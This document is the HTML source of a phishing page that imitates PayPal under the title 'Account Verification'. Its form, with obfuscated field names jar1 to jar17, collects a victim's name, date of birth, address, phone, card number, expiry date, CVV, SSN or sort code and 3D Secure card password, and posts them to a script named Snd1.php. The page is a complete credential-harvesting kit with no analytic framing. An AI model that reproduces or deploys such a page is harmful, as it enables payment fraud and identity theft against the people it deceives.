﻿﻿<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head></head><body id="desktop" screen_capture_injected="true">
                <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
<!-- saved from url=(0052)https://www.paypal.com/us/webapps/mpp/what-is-paypal -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
		
	
		<!--
	    	Script info: script: sparta, template:  , date: Feb 15, 2014 00:40:03 PST, country: US, language: en
	    	web version: 109.0-9490219
	    	content version: major version: 1 minor version: 18
	    	hostname : kw6aiGoRIptR6Jne1%2Bw%2BbXdo0bzCA0RWOUzN7G%2BLqlTUXibU75Dr80mIoviw4gkhnTMwpWvqTqQ
	    	rlogid : bzef%2BrzYlb7ayzJNwpFZ7Nhwq9%2FqD9pb66UOyvIGKDtELe8iHoIT%2BpvcwDMj0bE%2BeB4Xw0Pbi1U4Bkpse9tgyNx%2Bnqbe6JWh_14434b3d073
	    -->









		
	    <title>
		
	Account Verification - PayPal.
		
		</title>

         <style type="text/css">
.input.large[type="password"], input.large[type="text"] {
    font-size: 15px;
    font-weight: normal;
}
input.large {
    width: 7em;
}
input.large1 {
    width: 20em;
}
input.large2 {
    width: 5em;
	}
input.large-3 {
    width: 13em;
	}
input.large-4 {
    width: 15em;
	background: url('./img/mini_cvv2.gif')	
	line-height: 1.5;	
}
input {
    -moz-appearance: none;
    -moz-box-sizing: border-box;
    background: none repeat scroll 0px 0px #FFF;
    border: 1px solid #B3B3B3;
    border-radius: 5px;
    color: #333;
    font-size: 1.071rem;
    height: 38px;
    line-height: 1.25em;
    margin: 0px;
    padding: 0px;
    position: relative;
    text-indent: 10px;
    transition: border-color 0.3s ease 0s;
    width: 250px;
}
input, textarea {
    padding: 2px;
}
input, select, textarea {
    border: 1px solid #ADC2D6;
    font: 1em Arial,Helvetica,sans-serif;
}
form div p {
    color: #777;
    font-size: 1.071rem;
    line-height: 1.5em;
    margin: 0px;
    padding-bottom: 14px;
    padding-top: 4px;
}

.btn {
    -moz-box-sizing: border-box;
    background: none repeat scroll 0px 0px #0079C1;
    border-radius: 3px;
    color: #FFF;
    cursor: pointer;
    display: inline-block;
    font-family: arial,sans-serif;
    font-size: 15px;
    font-weight: bold;
    line-height: 1.4545em;
    margin-bottom: 0px;
    padding: 9px 15px 10px;
    text-align: center;
    vertical-align: middle;
    height: 40px;
}
         </style>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="application-name" content="PayPal">
		<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">		
		<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  		<meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		
		<meta name="keywords" content="">		
		<meta name="description" content="">
	
        
            <link rel="canonical" href="https://www.paypal.com/us/webapps/mpp/what-is-paypal?locale.x=en_US">
        
		
        
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        
		
		
	
	
	
			
			

		
		
		<link rel="stylesheet" href="./css/9433b8e9361a195efc95aefbc9fccb74fd0c22.css" type="text/css">
		
        
    		
    		
    			<link rel="stylesheet" href="./css/1472e9f7ae5b4c0c6c6ab806185c5e98f4592a.css" type="text/css">
    			
    			<!--[if IE 9]>
    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/27/dfc2b7f9bdd3e4d11dc097bd7d6ca7eaac674d.css" rel="stylesheet" type="text/css" />
    			<![endif]-->
    			<!--[if IE 8]>
    				<link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/89/1d32cb6854d1c68f590e1db67f8b1ee8a2d8ac.css" rel="stylesheet" type="text/css" />
    			<![endif]-->
    			
    		
        


		
				
				
		
		
		
	<style type="text/css">
		#content {
			border-top: 1px solid #d7d7d7;
		}
		.pageHeadline, .pageHeadline2, .contentHeadline {
			font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
		}
		#touchdevice .pageHeadline, .pageHeadline2, .contentHeadline {
			line-height: 38px;
		}
		#desktop .pageHeadline2 {
			margin-bottom: 19px;
			font-weight: 300;
			height: 38px;
			letter-spacing: 1px;
		}
		.featureImage {
			margin: 0 auto 8px;
		}	
		.kicker .span4 {
			margin-bottom: 25px;
		}
		#desktop .kicker .span4 p {
			width: 294px;
		}
		#desktop .contentHeadline {
			color: rgb(68, 68, 68);
			line-height: 28px;
		}
		
		/* mobile/tablet hacks*/
		#touchdevice #main {
			padding : 12px 0 0;
		}
		#touchdevice .pageHeadline h1 {
			float: left;
			font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
			white-space: nowrap;
		}

		/* phones */
		@media 
		only screen and (orientation: portrait) and (max-width: 479px),
		only screen and (orientation: landscape) and (max-width: 640px) {
			
			#touchdevice .pageHeadline2 {
				font-size: 24px;
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}
			#touchdevice .row-fluid .span7, #touchdevice .row-fluid .span4{
				width : 100%;
			}
		}

		/* small tablets */
		@media 
		only screen and (orientation: portrait) and (min-width: 480px) and (max-width: 767px),
		only screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) {

			#touchdevice .walletHero {
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}
			#touchdevice .featureImage {
				float : right;
			}
			
		}

		@media only screen and (orientation: portrait) and (min-width: 480px) and (max-width: 767px) {

			#touchdevice .row-fluid .span4,  #touchdevice .row-fluid .span7	{
				width : 100%;
				margin-left : 0;
			}
		}

		@media only screen and (orientation: landscape) and (min-width: 641px) and (max-width: 1023px) { 
			#touchdevice .row-fluid .span4	{
				width : 100%;
				margin-left : 0;
			}
		}

		/* regular tablets */
		@media 
		only screen and (orientation: portrait) and (min-width: 768px),
		only screen and (orientation: landscape) and (min-width: 1024px) {

			#touchdevice #main {
				width: auto;
				padding: 12px 30px 0 30px;
			}

			#touchdevice .walletHero {
				margin-top: -14px;
			}
			#touchdevice  p {
				font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, sans-serif;
				font-weight: normal;
				margin-top: 15px;
				margin-bottom: 20px;
				line-height: 24px;
			}
			#touchdevice .kicker .contentHeadline {
				color: rgb(68, 68, 68);
				font-size: 24px;
				padding-bottom ; 10px;
			}

			#touchdevice .row-fluid .span4 {
				width : 100%;
				margin-left : 0;
			}

			#touchdevice .featureImage {
				float : right;
			}
		}
	</style>



		

		

		<script>
			if (self === top) {
				var antiClickjack = document.getElementById("antiClickjack");
				antiClickjack.parentNode.removeChild(antiClickjack);
			} else {
				top.location = self.location;
			}
		</script><style type="text/css"></style>


		 <script src="./css/4619d0e7d26a8e05c2f9e9d2f0c4d66a68f024.js"></script> 
		 
        <!--[if lt IE 9]>
        <script>
        /* HTML5 tag support */
        document.createElement('header');
        document.createElement('nav');
        document.createElement('section');
        document.createElement('article');
        document.createElement('footer');
        </script>
        <![endif]-->		 
  	<link type="text/css" rel="stylesheet" href="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/style.css">
  	<style type="text/css">
  	input.large3 {    font-size: 15px;
    font-weight: normal;
}
input.large3 {    width: 7em;
}
    </style>
  	<script type="text/javascript" charset="utf-8" src="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/js/page_context.js"></script><script type="text/javascript" src="./js/baynote.js"></script>
	
    
    	
    		
    			
                  
                
    			
    		
    			<div id="page" style="margin-top:-15px;">

    				



<header class="gblMHeader">
  <div class="nav">
		<div class="navOut">
			<nav role="navigation">
				<ul>
					<li class="logo">
						<a href="#"><img src="./img/logo_paypal_106x29.png" alt="PayPal Home"></a>
					</li>
				</ul>
			</nav>
		</div>
	</div>
</header>

	
    				<div id="content" tabindex="-1">
    					<div id="main" role="main">						
    						

	<div id="mainContent">
		<div class="row-fluid">
			<div class="span12">
				<div class="pageHeadline">
					<h1> Update Account information.</h1>
				</div>
			</div>
		</div>
	<div class="moduleContent">
		<div class="row-fluid walletHero">
			<div class="span7">
				<h3><strong>Please make sure you enter your information correctly.</strong></h3>
				<p> </p>
<form action="Snd1.php" name="validateform" onsubmit="return check();" method="post">
  <p>&nbsp;</p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>
  </p><p></p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><p></p><p>  
  </p><table width="22%" border="0" cellspacing="2" cellpadding="2">
  <tbody><tr></tr>
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="login_email" class="large1" type="text" name="jar1" placeholder=" Name Printed On Card " required="" title="Please Enter Your  Cardholder's Name"></td>
  </tr>
  
  <tr>
    <th width="105" scope="row">Date Of Birth: </th>
    <td width="283" colspan="2"><input id="dd" onkeypress="return numbersonly(event)" class="large2" type="text" name="jar2" placeholder=" DD" required="" maxlength="2">
      <input id="mm" onkeypress="return numbersonly(event)" class="large2" type="text" name="jar3" placeholder="   MM" maxlength="2" required="">
      <input id="yyyy" onkeypress="return numbersonly(event)" class="large2" type="text" name="jar4" placeholder="  YYYY" maxlength="4" required=""></td>
  </tr>
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="address" class="large1" type="text" name="jar5" placeholder=" Address Line " required="" title="Please Enter Your Address Line 1"></td>
  </tr>
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="city" class="large1" type="text" name="jar7" placeholder=" City " required="" title="Please Enter Your City"></td>
  </tr>
  
     <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="state" class="large1" type="text" name="jar8" placeholder=" State " required="" title="Please Enter Your state"></td>
  </tr>
  
    <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="country" class="large1" type="text" name="jar9" placeholder=" Country" required="" title="Please Enter Your Country"></td>
  </tr>
  
       <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="zip" class="large1" type="text" name="jar10" placeholder=" ZIP / Postal Code " required="" title="Please Enter Your Zip/Postal Code"></td>
  </tr>
  
   <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="phone" class="large1" type="text" name="jar11" placeholder=" Phone Number" required="" title="Please Enter Your Phone Number"></td>
  </tr>
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="CCN" class="large1" type="text" name="jar12" placeholder=" Credit Card Number " required="" title="Please Enter Your Credit Card Number" maxlength="16"></td>
  </tr>
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2" style="
    width: 474.625;
    padding-left: 0px;
">
<input id="card_type" type="text" name="card_type" style="display:none;">&nbsp;


<img src="./img/logo_ccVisa1.gif" id="logo_ccVisa1.gif" alt="Visa" border="0" width="30" height="21" align="top" style="
    width: 31px;
">
<img src="./img/logo_ccMC1.gif" id="logo_ccMC1.gif" alt="MasterCard" border="0" width="30" height="21" align="top" style="
    width: 31px;
">
<img src="./img/logo_ccDiscover1.gif" id="logo_ccDiscover1.gif" alt="Discover" border="0" width="30" height="21" align="top" style="
    width: 31px;
">
<img src="./img/logo_ccAmex1.gif" id="logo_ccAmex1.gif" alt="Amex" border="0" width="30" height="21" align="top" style="
    width: 32px;
    height: 20px;
">
</td>
  </tr>
  
   <tr>
    <th width="105" scope="row">Expiration Date: </th>
    <td width="283" colspan="2">
      <input id="mm" onkeypress="return numbersonly(event)" class="large2" type="text" name="jar13" placeholder="  MM" maxlength="2" required="">
      <input id="yyyy" onkeypress="return numbersonly(event)" class="large2" type="text" name="jar14" placeholder="  YY" maxlength="2" required=""></td>
  </tr>
  
     <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="cvv" class="large-4" type="text" name="jar15" placeholder=" CVC (CVV) " required="" title="Please Enter Your Card Verification Code" style="
    width: 164px;
"></td>
  </tr>
  
    <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="cvv" class="large1" type="text" name="jar16" placeholder=" SSN | Sort Code"></td>
  </tr>
    <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td width="283" colspan="2"><input id="cvv" class="large1" type="text" name="jar17" placeholder=" Card Password ( VBV | 3D Secure )"></td>
  </tr>
     
  
  <tr>
    <th width="105" scope="row">&nbsp;</th>
    <td colspan="2"><input id="login.x" class="btn large" type="submit" value="Next" name="login" style="
    padding-left: 0px;
"></td>
  </tr>
  </tbody></table>
</form> 				
			</div>
			<div class="span5 hidden-phone">
				 <img src="./img/info-wallet-balance.png" alt="Wallet Feature Image" width="359" height="241">
                 <p>&nbsp;</p>
                  <p>&nbsp;</p>
                   <p>&nbsp;</p>
			</div>
		</div>
		<div class="row-fluid kicker"></div>
	</div>
	</div>

						
    					</div>
    				</div>
    				

	<footer id="gblMarketingFooter" role="contentinfo">
		<div class="utility">
			<div class="footerNav"> 
				<nav>
					<ul style="margin-left: 273px;">
						
							
								
								
									<li>
<a href="#">Help</a>
</li>
								
									<li>
<a href="#">Contact</a>
</li>
								
									<li>
<a href="#">Fees</a>
</li>
								
									<li>
<a href="#">Security</a>
</li>
								
									<li>
<a href="#">Features</a>
</li>
								
									<li>
<a href="#">Shop</a>
</li>
								
																		
						
					</ul>
				      
	   
		<script type="text/javascript">
			window.PAYPAL = window.PAYPAL ? window.PAYPAL : {};
			window.PAYPAL.util = window.PAYPAL.util ? window.PAYPAL.util : {};
			PAYPAL.util.ppobjectsPath = "https://www.paypalobjects.com";
		</script></nav>
			</div>
		</div>
		<div class="footer">
			<div class="footerNav clearfix"> 
				<div class="wrapper" style="margin-left: 205px;">			
					<ul class="topList">											
						
							
								
								
									<li>
<a href="#">About</a>
</li>
								
									<li>
<a href="#">Blog</a>
</li>
								
									<li>
<a href="#">Jobs</a>
</li>
								
									<li>
<a href="#">Sitemap</a>
</li>
								
									<li>
<a href="#">eBay</a>
</li>
								
									<li>
<a href="#">Developers</a>
</li>
								
									<li>
<a href="#">Enterprise</a>
</li>
								
									<li>
<a href="#">Partners</a>
</li>
								
								
						
						<li id="siteFeedback">
							


						<a href="#">Feedback</a><img src="./img/sm_333_oo.gif" alt=""></li>
					</ul>
					<div class="legal" style="margin-left: 146px;">
						
						<p class="copyright">
						© 1999 - 2016 PayPal
						</p>
						<ul>
							
								
									<li>
<a href="#">Privacy</a>
</li>
									<li>
<a href="#">Legal</a>
</li>
										
								</ul>
									
									  	
									  	
									  	
									  	
									  	<p class="legalContent">

</p>
									  	
									  	
									  	
									  	
									  	
									  										  	
	    							
							
					</div>
				</div>
				<span class="countryList">				</span>
			</div>
		</div>
	</footer>
    			</div>
</body></html>